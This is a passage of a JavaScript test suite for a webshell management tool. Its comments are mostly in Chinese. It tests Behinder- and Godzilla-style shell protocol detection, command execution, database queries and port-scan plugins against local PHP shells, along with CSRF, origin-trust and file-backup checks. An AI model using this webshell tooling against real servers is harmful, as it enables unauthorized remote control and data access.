			if (!r.hit || r.protocol !== "behinder") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("beh.php"), protocol: "behinder", password: "pw-beh" });
			const out = await cap.runCommand(conn, "echo BEHOK");
			if (!out.includes("BEHOK")) throw new Error(String(out).slice(0, 200));
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "beh.php")) throw new Error("结构化 ls 缺文件");
		});

		await ok("PHP 回路：哥斯拉型形态马——识别 + 桥接 eval + 数据库", async () => {
			const r = await detectProtocol({ url: U("god.php"), password: "gk", secretKey: "sk-123" });
			if (!r.hit || r.protocol !== "godzilla") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("god.php"), protocol: "godzilla", password: "gk", secret_key: "sk-123" });
			const out = await cap.runCommand(conn, "echo GODOK");
			if (!out.includes("GODOK")) throw new Error(String(out).slice(0, 200));
			const profile = { type: "sqlite", host: "", port: 0, username: "", password: "", database: join(tmp, "test.db") };
			const q = await cap.dbQuery(conn, profile, "SELECT COUNT(*) AS n FROM t");
			if (!q.rows || q.rows[0][0] !== "2") throw new Error(JSON.stringify(q).slice(0, 300));
		});

		if (existsSync(join(tmp, "shells", "bmod.php"))) {
			await ok("PHP 回路：魔改冰蝎型马——识别 + 命令执行（与 av-lab 马字节级互通）", async () => {
				// php -S 单线程时序怪癖容错：协商型协议偶发响应错乱——重试三轮（每轮新会话）
				let last = "";
				for (let attempt = 0; attempt < 3; attempt++) {
					const r = await detectProtocol({ url: U("bmod.php"), password: "sess-abc", secretKey: "x9k2" });
					if (!r.hit || r.protocol !== "behinder-mod") throw new Error(JSON.stringify(r).slice(0, 400));
					const conn = mkConn({ url: U("bmod.php"), protocol: "behinder-mod", password: "sess-abc", secret_key: "x9k2", id: "t-bmod-" + attempt });
					let out;
					try { out = await cap.runCommand(conn, "echo BMODOK"); }
					catch (e) { last = "attempt" + attempt + ": " + e.message; continue; } // 协商会话错乱——弃会话重来
					if (out.includes("BMODOK")) return;
					last = String(out).slice(0, 200);
				}
				throw new Error(last);
			});
		} else skip("PHP 回路：魔改冰蝎", "av-lab 马文件不可达");

		if (existsSync(join(tmp, "shells", "gmod.php"))) {
			await ok("PHP 回路：魔改哥斯拉型马——识别 + 命令执行（md5 校验回传）", async () => {
				// 同上：php -S 时序容错三轮
				let last = "";
				for (let attempt = 0; attempt < 3; attempt++) {
					const r = await detectProtocol({ url: U("gmod.php"), password: "xg-123", secretKey: "g7#m" });
					if (!r.hit || r.protocol !== "godzilla-mod") throw new Error(JSON.stringify(r).slice(0, 400));
					const conn = mkConn({ url: U("gmod.php"), protocol: "godzilla-mod", password: "xg-123", secret_key: "g7#m", id: "t-gmod-" + attempt });
					let out;
					try { out = await cap.runCommand(conn, "echo GMODOK"); }
					catch (e) { last = "attempt" + attempt + ": " + e.message; continue; }
					if (out.includes("GMODOK")) return;
					last = String(out).slice(0, 200);
				}
				throw new Error(last);
			});
		} else skip("PHP 回路：魔改哥斯拉", "av-lab 马文件不可达");

		await ok("PHP 回路：数据库（sqlite PDO 全链路）", async () => {
			const conn = mkConn({ url: U("aes2.php"), protocol: "dsh-aes" });
			const profile = { type: "sqlite", host: "", port: 0, username: "", password: "", database: join(tmp, "test.db") };
			const r = await cap.dbQuery(conn, profile, "SELECT id, name FROM t ORDER BY id");
			if (!r.cols || r.cols.join(",") !== "id,name") throw new Error(JSON.stringify(r).slice(0, 300));
			if (JSON.stringify(r.rows) !== JSON.stringify([["1", "alpha"], ["2", "beta"]])) throw new Error(JSON.stringify(r.rows));
		});

		await ok("PHP 回路：载荷插件（sysinfo + portscan 经 eval 通道）", async () => {
			const userDir = join(tmpdir(), "wsm-none");
			const { runPlugin, getPlugin: gp } = await import("../lib/plugins-registry.js");
			const conn = mkConn({ url: U("one.php"), protocol: "cmd-eval" });
			const r1 = await runPlugin(conn, gp(userDir, "sysinfo"), {});
			if (!r1 || !r1.php) throw new Error(JSON.stringify(r1).slice(0, 300));
			const r2 = await runPlugin(conn, gp(userDir, "portscan"), { host: "127.0.0.1", ports: String(phpPort), timeout: "2" });
			if (!r2 || !Array.isArray(r2.open) || !r2.open.includes(phpPort)) throw new Error(JSON.stringify(r2).slice(0, 300));
		});
	}
	php.kill();
	// Windows may retain PHP/SQLite file handles briefly after SIGTERM.
	// Cleanup failure must not turn a fully passing functional suite red.
	await new Promise((resolve) => setTimeout(resolve, 300));
	try { rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); }
	catch { /* OS temp will be reclaimed later */ }
} else {
	skip("PHP 回路烟测", "本机无 php");
}

//#endregion


// 信任栅栏：端口比对（本机他端口 Origin 拒）
await ok("栅栏：loopback 放行、外域拒、本机他端口 Origin 拒", () => {
	const mk = (h) => ({ headers: h });
	if (isTrustedRequest(mk({ host: "127.0.0.1:3080" }), []) !== true) throw new Error("loopback 应放行");
	if (isTrustedRequest(mk({ host: "evil.com:3080" }), []) !== false) throw new Error("外域应拒");
	if (isTrustedRequest(mk({ host: "127.0.0.1:3080", origin: "http://127.0.0.1:9999" }), []) !== false) throw new Error("本机他端口 Origin 应拒（端口比对）");
	if (isTrustedRequest(mk({ host: "127.0.0.1:3080", origin: "http://127.0.0.1:3080" }), []) !== true) throw new Error("同源应放行");
});

await ok("CSRF 头校验：匹配放行/缺失或错值拒", () => {
	if (checkCsrf({ headers: { "x-dsh-csrf": "T" } }, "T") !== true) throw new Error("匹配应放行");
	if (checkCsrf({ headers: { "x-dsh-csrf": "X" } }, "T") !== false) throw new Error("错值应拒");
	if (checkCsrf({}, "T") !== false) throw new Error("缺头应拒");
});

//#region 客户端载荷契约（回归锁）
// 单一库视图里的条目来自「目录即库」的扫描结果，并不在 WS_CFG.selfShells 里；
// 后端 self-content-get / self-content-set / self-update 都按 id-or-file 解析，
// 只给 id 一律落空（self-content-* 直接报「缺 file」）。历史故障：只传 id →
// 后端回 ok:false → 连接层判为 invalid server-response result 而 reject →
// 编辑器没有 catch，永远停在「加载中…」，读和写全废。
const CLIENT_SRC = readFileSync(join(PKG, "lib", "client.js"), "utf8");
const payloadOf = (endpoint) => {
	const m = CLIENT_SRC.match(new RegExp(`"${endpoint}",\\s*\\{([^}]*)\\}`));
	if (!m) throw new Error(`lib/client.js 里找不到 ${endpoint} 的调用`);
	return m[1];
};

await ok("编辑内容：self-content-get 载荷同时带 id 与 file", () => {
	const p = payloadOf("self-content-get");
	if (!/file\s*:/.test(p)) throw new Error(`载荷缺 file：{${p}}`);
});
await ok("保存：self-content-set 载荷同时带 id 与 file", () => {
	const p = payloadOf("self-content-set");
	if (!/file\s*:/.test(p)) throw new Error(`载荷缺 file：{${p}}`);
});
await ok("组改名：按 id 的 self-update 载荷带 file（否则整组静默不改）", () => {
	// 注意：self-update 有多处调用（改密那处只有 file、没有 id），必须锚定「按 id 整组改名」这处，
	// 否则正则会先命中改密那处，测试变成永远通过的空锁。
	// 另注：组改名的入口已从 window.prompt 换成应用内 FormModal，载荷构造点随之改名（s → it2），
	// 故这里按「所有带 id 的 self-update 载荷」匹配，不绑定具体变量名。
	const all = [...CLIENT_SRC.matchAll(/"self-update",\s*\{([^}]*)\}/g)].map((m) => m[1]);
	const withId = all.filter((p) => /id\s*:/.test(p));
	if (!withId.length) throw new Error("找不到「按 id 整组改名」的 self-update 调用");
	if (!withId.some((p) => /file\s*:/.test(p))) {
		throw new Error(`按 id 的 self-update 载荷缺 file：${JSON.stringify(withId)}`);
	}
});
await ok("编辑内容读失败要有 catch，不允许静默停在「加载中…」", () => {
	if (!CLIENT_SRC.includes('}).catch(function (e) { setMsg("读取失败：')) {
		throw new Error("self-content-get 的 then 后面没有 catch");
	}
	if (!CLIENT_SRC.includes('}).catch(function (e) { setMsg("保存失败：')) {
		throw new Error("self-content-set 的 then 后面没有 catch");
	}
});
//#endregion

//#region 7. 内置模板参数占位符不自相矛盾
// 客户端曾把 hint 再拼一次「（留空=默认）」，于是 hint 本身已含该说明的字段显示成
// 「留空=生成时随机（留空=默认）」—— 既说留空随机、又说留空取默认，4 个字段全都如此。
{
	const INDEX_SRC = readFileSync(join(PKG, "lib", "index.js"), "utf8");
	await ok("客户端不再给参数 hint 拼后缀", () => {
		if (!CLIENT_SRC.includes("placeholder: f.hint")) throw new Error("客户端没在用裸 hint");
		if (CLIENT_SRC.includes("（留空=默认）")) throw new Error("客户端仍硬拼「（留空=默认）」");
	});
	await ok("hint 自带「（留空=默认）」，信息没有丢", () => {
		const n = (INDEX_SRC.match(/（留空=默认）/g) || []).length;
		if (n !== 4) throw new Error(`index.js 里「（留空=默认）」出现 ${n} 次，期望 4`);
	});
	await ok("不存在双后缀 / 矛盾后缀", () => {
		if (/（留空=默认）（留空=默认）/.test(INDEX_SRC)) throw new Error("双后缀");
		if (/留空=生成时随机（留空=默认）/.test(INDEX_SRC)) throw new Error("矛盾：留空既随机又默认");
	});
}
//#endregion

//#region 8. 协议响应 JSON 解析必须带上下文错误
await ok("合法 JSON 响应原样解析", () => {
	const value = parseJsonResponse('[{"n":"a.txt"}]', "测试协议");
	if (!Array.isArray(value) || value[0].n !== "a.txt") throw new Error(JSON.stringify(value));
});
await ok("非法 JSON 响应带协议上下文和响应预览", () => {
	let caught;
	try { parseJsonResponse("<html>bad gateway</html>", "冰蝎 Java 目录列表"); }
	catch (error) { caught = error; }
	if (!caught) throw new Error("坏响应没有被拒绝");
	if (!/冰蝎 Java 目录列表返回非 JSON/.test(caught.message)) throw new Error(caught.message);
	if (!/响应预览：<html>bad gateway<\/html>/.test(caught.message)) throw new Error(caught.message);
});
//#endregion

// 连接层契约：/dsh-webshell-mgr-rpc 的失败必须是结构化错误对象。
// 回字符串会被客户端 parseConnectionResponse 判成 invalid server-response result
// 并 reject 掉 Promise —— 界面卡在"上传中"且不显示任何原因（实测同源问题在
// knowledge-hub 上表现为「点开 EDB 命中后详情区白板 + 卡在保存中」）。
await ok("RPC 失败返回结构化错误（连接层契约）", () => {
	const server = readFileSync(join(PKG, "lib", "index.js"), "utf8");
	const start = server.indexOf('connection.register(ctx, "/dsh-webshell-mgr-rpc"');
	if (start < 0) throw new Error("找不到 RPC 注册块");
	// 取到下一个 connection.register 或文件末尾
	const next = server.indexOf("connection.register(", start + 10);
	const block = server.slice(start, next < 0 ? undefined : next);
	if (!block.includes("const rpcFail = (message) => ({ ok: false, error: { code:")) {
		throw new Error("RPC 块缺少结构化失败助手 rpcFail");
	}
	const legacy = block.match(/ok:\s*false,\s*error:\s*"/);
	if (legacy) throw new Error(`RPC 块仍有字符串错误：${legacy[0]}`);
});

await ok("客户端按结构化错误取文案（不会把对象塞进 React 子节点）", () => {
	const client = readFileSync(join(PKG, "lib", "client.js"), "utf8");
	if (!client.includes("function errOf(r)")) throw new Error("client 缺少 errOf 助手");
	if (/(r && r\.error) \|\|/.test(client)) throw new Error("client 仍在直接把 r.error 当文案");
});

// 覆盖写用户文件前必须留备份：self-content-set 直接写用户的 WebShell 目录，
// 覆盖不可恢复（回收站收不到覆盖）。2026-09-19 一次误操作把 jsp_antsword.jsp
// 覆盖成测试串，本机无副本，只能按 JDK9 孪生文件重写一份功能等价版本。
await ok("覆盖写前留备份（内容一致 + 每个文件只留 5 份）", async () => {
	const { backupBeforeWrite } = await import("../lib/index.js");
	const dir = mkdtempSync(join(tmpdir(), "wsm-backup-"));
	try {
		const name = "shell.jsp";
		const original = "ORIGINAL-CONTENT-请勿丢失";
		writeFileSync(join(dir, name), original, "utf8");
		const first = backupBeforeWrite(dir, name);
		if (!first) throw new Error("首次备份没有返回路径");
		if (readFileSync(first, "utf8") !== original) throw new Error("备份内容与原文件不一致");
		// 连写 7 次，最多留 5 份
		for (let i = 0; i < 7; i += 1) {
			writeFileSync(join(dir, name), `v${i}`, "utf8");
			backupBeforeWrite(dir, name);
		}
		const kept = readdirSync(join(dir, ".backups")).filter((f) => f.startsWith(name + "."));
		if (kept.length !== 5) throw new Error(`备份份数应为 5，实际 ${kept.length}`);
		// 不存在的文件不产生备份
		if (backupBeforeWrite(dir, "not-there.jsp") !== "") throw new Error("不存在的文件不该产生备份");
	} finally {
		rmSync(dir, { recursive: true, force: true });
	}
});

// 删除文件同样要先备份：self-remove(deleteFile) 删的是用户的马库文件。
await ok("删除文件前也先备份（不是直接 unlink）", () => {
	const src = readFileSync(join(PKG, "lib", "index.js"), "utf8");
	const start = src.indexOf('if (endpoint === "self-remove")');
	if (start < 0) throw new Error("找不到 self-remove 分支");
	const next = src.indexOf('if (endpoint ===', start + 10);
	const block = src.slice(start, next < 0 ? undefined : next);
	const backupAt = block.indexOf("backupBeforeWrite(genBase(), file)");
	const unlinkAt = block.indexOf("fsUnlink(");
	if (backupAt < 0) throw new Error("self-remove 没有先备份");
	if (unlinkAt < 0) throw new Error("self-remove 没有删除动作（分支写错了？）");
	if (backupAt > unlinkAt) throw new Error("备份必须发生在 unlink 之前");
});

console.log(`\n结果：${results.pass} 通过 / ${results.fail} 失败 / ${results.skip} 跳过`);
process.exit(results.fail ? 1 : 0);
